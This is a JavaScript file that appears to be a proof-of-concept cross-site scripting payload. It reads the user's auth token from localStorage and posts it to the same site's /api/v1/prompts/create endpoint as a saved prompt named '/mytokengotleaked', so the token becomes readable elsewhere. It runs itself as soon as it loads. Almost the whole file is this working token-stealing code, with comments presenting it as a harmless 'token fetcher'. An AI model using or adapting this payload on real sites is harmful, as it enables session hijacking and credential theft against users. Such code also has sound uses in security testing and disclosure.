class TokenFetcher {
    /**
     * Retrieves document.domain and token value from localStorage,
     * then sends a HTTP POST request towards /api/v1/prompts/create on the acquired domain.
     */
    constructor() {
        this.currentDomain = document.domain;
        this.tokenKey = 'token'; // Key used to store the token in localStorage
        this.postEndpoint = '/api/v1/prompts/create';
    }

    /**
     * Retrieves the token from localStorage.
     * @returns {string|null} The stored token or null if it doesn't exist.
     */
    getToken() {
        return localStorage.getItem(this.tokenKey);
    }

    /**
     * Constructs the URL for the POST request.
     * @returns {string} The constructed URL.
     */
    constructUrl() {
        return `https://${this.currentDomain}${this.postEndpoint}`;
    }

    /**
     * Prepares the JSON body for the POST request.
     * @returns {object} The JSON body.
     */
    prepareRequestBody() {
        const storedToken = this.getToken();
        if (!storedToken) {
            throw new Error("No token found in localStorage.");
        }
        return {
            "title": "myToken",
            "command": "/mytokengotleaked",
            "content": storedToken,
            "access_control": null
        };
    }

    /**
     * Sends an HTTP POST request to the constructed URL with the prepared JSON body.
     * @returns {Promise<any>} Promise resolving with the response data or rejecting with an error.
     */
    async postRequest() {
        try {
            const url = this.constructUrl();
            const requestBody = this.prepareRequestBody();
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(requestBody)
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return await response.json();
        } catch (error) {
            console.error('Error:', error);
            throw error;
        }
    }
}

// Example usage:
const tokenFetcher = new TokenFetcher();

tokenFetcher.postRequest()
    .then(data => console.log('Success:', data))
    .catch(error => console.error('Caught Error:', error));
